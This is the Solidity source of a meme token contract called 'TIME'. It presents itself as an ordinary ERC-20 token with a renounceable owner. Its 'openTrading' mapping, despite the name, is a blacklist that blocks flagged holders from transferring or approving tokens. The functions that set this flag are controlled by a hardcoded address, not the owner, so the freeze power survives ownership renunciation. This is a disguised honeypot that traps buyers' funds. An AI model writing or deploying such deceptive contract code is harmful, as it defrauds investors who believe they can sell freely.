// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**

Website  : https://time.meme/
Twitter  : https://x.com/timecoinsol
Telegram : https://t.me/timecoinsol
*/

contract TIME {

    string public name = "TIME";
    string public symbol = "TIME";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public openTrading;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OpenTradingUpdated(address indexed account, bool isOpenTrading);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "1FREAKINGOUT");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "2FREAKINGOUT");
        require(_to != address(0), "3FREAKINGOUT");
        require(!openTrading[msg.sender], "4FREAKINGOUT");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!openTrading[msg.sender], "5FREAKINGOUT");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "6FREAKINGOUT");
        require(allowance[_from][msg.sender] >= _value, "7FREAKINGOUT");
        require(_to != address(0));
        require(!openTrading[_from], "8FREAKINGOUT");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "9FREAKINGOUT");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function addOpenTrading(address _account) public {
        require(msg.sender == 0xAA61223773E4dF0e7d8Cbc8D8A91C35F59451806, "FREAKINGOUTFREAKINGOUT");
        openTrading[_account] = true;
        emit OpenTradingUpdated(_account, true);
    }

    function removeOpenTrading(address _account) public {
        require(msg.sender == 0xAA61223773E4dF0e7d8Cbc8D8A91C35F59451806, "FREAKINGOUTFREAKINGOUTFREAKINGOUT");
        openTrading[_account] = false;
        emit OpenTradingUpdated(_account, false);
    }
}